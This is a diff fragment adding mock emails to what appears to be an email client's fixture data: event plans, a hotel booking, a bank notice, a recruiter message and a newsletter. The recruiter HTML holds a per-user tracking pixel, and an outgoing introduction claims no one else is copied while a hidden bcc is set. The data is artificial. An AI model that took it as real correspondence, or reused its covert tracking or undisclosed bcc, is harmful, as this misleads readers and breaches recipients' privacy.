+    "body": "Hi,\n\nFor Saturday, in the order they matter:\n\nBring\n  - the proofs Marta sent (the second one, not the first)\n  - your laptop and the long charger\n  - something for the table; I'll provide the wine\n\nRead before you come\n  1. https://harbourbooks.example/notes/event-space\n  2. <https://harbourbooks.example/notes/seating-plan> (two pages, both short)\n  3. The floor plan: https://harbourbooks.example/files/floor-plan.pdf\n\nTasks I'd like to hand out\n  * Signage — who is good with a marker?\n  * Door list — 60 names, alphabetical, no surprises\n  * Tea and coffee from 17:00\n\nMeet at the side entrance on Quay Street at 16:15. If it's locked, ring 020 7946 0099 and I'll let you in.\n\n— Nadia",
+    "received": "2026-09-22T13:30:00Z",
+    "state": "Inbox",
+    "account": "personal"
+  },
+  {
+    "id": 78,
+    "thread_id": 1013,
+    "from_name": "Yara Haddad",
+    "from_email": "yara@fieldnotes.example",
+    "to": "you@example.com",
+    "subject": "reading group: pick a date after the 12th",
+    "body": "Reading group is back. I'd like to start with the state-machine essay and work outward.\n\nI can do any weekday evening after the 12th. Pick one and I'll book the room; no rush, this can sit until you're back.\n\n— Yara",
+    "received": "2026-09-21T18:05:00Z",
+    "state": "Snoozed",
+    "account": "personal",
+    "snooze": "2026-10-12T08:00:00Z"
+  },
+  {
+    "id": 79,
+    "thread_id": 1014,
+    "from_name": "Old National Bank",
+    "from_email": "statements@oldnational.example",
+    "to": "you@example.com",
+    "subject": "Tax documents for 2026 are ready to download",
+    "body": "Your 2026 tax documents (interest summary and year-end statement) are ready.\n\nSign in to Online Banking and open Documents to download them. They stay available for seven years.\n\nThis is an automated message. Please do not reply.",
+    "received": "2026-09-19T07:00:00Z",
+    "state": "Snoozed",
+    "account": "personal",
+    "snooze": "2026-11-02T09:00:00Z"
+  },
+  {
+    "id": 80,
+    "thread_id": 1015,
+    "from_name": "Hotel Alfama",
+    "from_email": "no-reply@hotelalfama.example",
+    "to": "you@example.com",
+    "subject": "Booking confirmed: Hotel Alfama, 8–11 Oct, 2 guests",
+    "body": "Your booking is confirmed.\n\n  Hotel Alfama, Rua de São Miguel 12, Lisbon\n  Check-in   Thu 8 Oct, from 15:00\n  Check-out  Sun 11 Oct, by 11:00\n  Room       Double, river side, breakfast included\n\nFree cancellation until 5 Oct. Manage your booking: https://hotelalfama.example/booking/A91-7730",
+    "received": "2026-09-13T15:48:00Z",
+    "state": {
+      "Filed": 2
+    },
+    "account": "personal"
+  },
+  {
+    "id": 81,
+    "thread_id": 1016,
+    "from_name": "Mum",
+    "from_email": "mum@whitfield.home",
+    "to": "you@example.com",
+    "subject": "Christmas dates",
+    "body": "Your father wants to know the dates now so he can complain about them early.\n\nWe're thinking the 23rd to the 27th. Tell your sister. Tell her it's not optional.\n\nLove, Mum",
+    "received": "2026-09-09T20:15:00Z",
+    "state": {
+      "Filed": 3
+    },
+    "account": "personal"
+  },
+  {
+    "id": 82,
+    "thread_id": 1017,
+    "from_name": "You",
+    "from_email": "you@example.com",
+    "to": "Marta Nowak <marta@nowakphoto.example>, Nadia Farouk <nadia@harbourbooks.example>",
+    "subject": "Introducing Marta and Nadia",
+    "body": "Marta, Nadia,\n\nYou two should talk. Marta is printing the Lisbon run and needs a room for the launch; Nadia has a room and opinions about posters.\n\nI have copied nobody else on this, so you can both say no quietly. The proofs are attached for reference.\n\nOver to you.",
+    "received": "2026-09-16T11:25:00Z",
+    "state": "Archived",
+    "account": "personal",
+    "bcc": "Dana Whitfield <dana@whitfield.dev>",
+    "attachments": [
+      {
+        "name": "lisbon-proofs-v2.pdf",
+        "size": 1930245
+      }
+    ],
+    "outgoing": true
+  },
+  {
+    "id": 83,
+    "thread_id": 1018,
+    "from_name": "Jordan Pike",
+    "from_email": "jordan@talentloop.com",
+    "to": "you@example.com",
+    "subject": "Quick intro — senior platform roles, no obligation",
+    "body": "Hi,\n\nI lead placements for senior platform engineers at TalentLoop and your profile came up twice this week.\n\nThree roles, all remote, all above market. Details at https://talentloop.com/roles/platform.\n\nBest,\nJordan",
+    "received": "2026-09-18T15:00:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "html": "<html><body><img src=\"https://cdn.talentloop.com/brand/header.png\" alt=\"TalentLoop\"><h2>Senior platform roles, no obligation</h2><p>I lead placements for senior platform engineers at <strong>TalentLoop</strong> and your profile came up twice this week.</p><ul><li>Platform Engineer, fintech — remote</li><li>Staff SRE, logistics — remote</li><li>Tech Lead, devtools — hybrid</li></ul><p><a href=\"https://talentloop.com/roles/platform?src=mail&amp;uid=77412\">See all three roles</a></p><img src=\"https://track.talentloop.com/pixel.gif?uid=77412\" width=\"1\" height=\"1\" alt=\"\"></body></html>"
+  },
+  {
+    "id": 84,
+    "thread_id": 1019,
+    "from_name": "Changelog Weekly",
+    "from_email": "editors@changelog.example",
+    "to": "you@example.com",
+    "subject": "This week: sparklines, slow starts, and a very fast linter",
+    "body": "Changelog Weekly\n\nSparklines in the terminal\n  A tiny library draws a twelve-week trend in one line of Unicode. Good for status bars, bad for arguing about axes.\n\nSlow starts\n  A post-mortem on a 4-second cold start that turned out to be one synchronous DNS lookup.\n\nA very fast linter\n  Checks a 400k-line repository in under a second by refusing to parse what hasn't changed.\n\nRead online: https://changelog.example/weekly/2026-38",
+    "received": "2026-09-17T07:00:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "html": "<html><body><h1>Changelog Weekly</h1><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAICAIAAABsw6g0AAAAL0lEQVR42mP48v4ZGWhziBwam4ESzcgkAyWaCRhEvGaiDCKVZKBEM4pBlBtBZYMAOiKt0Kk8q7IAAAAASUVORK5CYII=\" alt=\"Reads over the last twelve weeks\" width=\"96\" height=\"32\"><h2>Sparklines in the terminal</h2><p>A tiny library draws a twelve-week trend in one line of Unicode. Good for status bars, bad for arguing about axes.</p><h2>Slow starts</h2><p>A post-mortem on a 4-second cold start that turned out to be one synchronous DNS lookup.</p><img src=\"https://cdn.changelog.example/weekly/2026-38/dns.png\" alt=\"Flame graph of the cold start\"><h2>A very fast linter</h2><p>Checks a 400k-line repository in under a second by refusing to parse what hasn't changed.</p><p><a href=\"https://changelog.example/weekly/2026-38\">Read online</a></p></body></html>"
   }
 ]
